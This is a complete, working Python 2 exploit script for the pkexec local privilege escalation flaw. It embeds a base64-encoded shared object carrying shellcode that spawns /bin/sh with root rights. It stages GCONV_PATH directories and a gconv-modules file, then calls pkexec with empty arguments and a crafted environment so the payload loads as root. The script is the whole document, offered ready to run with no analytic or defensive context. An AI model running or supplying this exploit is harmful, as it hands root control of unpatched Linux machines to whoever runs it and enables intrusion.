#!/usr/bin/env python2

import base64
import os
import sys

from ctypes import *
from ctypes.util import find_library

payload_b64 = '''
f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAkgEAAAAAAABAAAAAAAAAALAAAAAAAAAAAAAAAEAAOAAC
AEAAAgABAAEAAAAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAArwEAAAAAAADMAQAAAAAAAAAQ
AAAAAAAAAgAAAAcAAAAwAQAAAAAAADABAAAAAAAAMAEAAAAAAABgAAAAAAAAAGAAAAAAAAAAABAA
AAAAAAABAAAABgAAAAAAAAAAAAAAMAEAAAAAAAAwAQAAAAAAAGAAAAAAAAAAAAAAAAAAAAAIAAAA
AAAAAAcAAAAAAAAAAAAAAAMAAAAAAAAAAAAAAJABAAAAAAAAkAEAAAAAAAACAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAwAAAAAAAAAkgEAAAAAAAAFAAAAAAAAAJABAAAAAAAABgAAAAAA
AACQAQAAAAAAAAoAAAAAAAAAAAAAAAAAAAALAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAASDH/amlYDwVIuC9iaW4vc2gAmVBUX1JeajtYDwU=
'''
payload = base64.b64decode(payload_b64)

environ = [
    'exploit',
    'PATH=GCONV_PATH=.',
    'LC_MESSAGES=en_US.UTF-8',
    'XAUTHORITY=../LOL',
    None
]

# Find the C library to call execve() directly, as Python helpfully doesn't
# allow us to call execve() with no arguments.
try:
    libc = CDLL(find_library('c'))
except:
    print '[!] Unable to find the C library, wtf?'
    sys.exit()

# Create the shared library from the payload
print '[+] Creating shared library for exploit code.'
try:
    with open('payload.so', 'wb') as f:
        f.write(payload)
except:
    print '[!] Failed creating payload.so.'
    sys.exit()
os.chmod('payload.so', 0755)

# make the GCONV_PATH directory
try:
    os.mkdir('GCONV_PATH=.')
except OSError:
    print '[-] GCONV_PATH=. directory already exists, continuing.'
except:
    print '[!] Failed making GCONV_PATH=. directory.'
    sys.exit()

# Create a temp exploit file
try:
    with open('GCONV_PATH=./exploit', 'wb') as f:
        f.write('')
except:
    print '[!] Failed creating exploit file'
    sys.exit()
os.chmod('GCONV_PATH=./exploit', 0755)

# Create directory to hold gconf-modules configuration file
try:
    os.mkdir('exploit')
except OSError:
    print '[-] exploit directory already exists, continuing.'
except:
    print '[!] Failed making exploit directory.'
    sys.exit()

# Create gconf config file
try:
    with open('exploit/gconv-modules', 'wb') as f:
        f.write('module  UTF-8//    INTERNAL    ../payload    2\n')
except:
    print '[!] Failed to create gconf-modules config file.'
    sys.exit()

# Convert the environment to an array of char*
environ_p = (c_char_p * len(environ))()
environ_p[:] = environ

print '[+] Calling execve()'
# Call execve() with NULL arguments
libc.execve('/usr/bin/pkexec', c_char_p(None), environ_p)
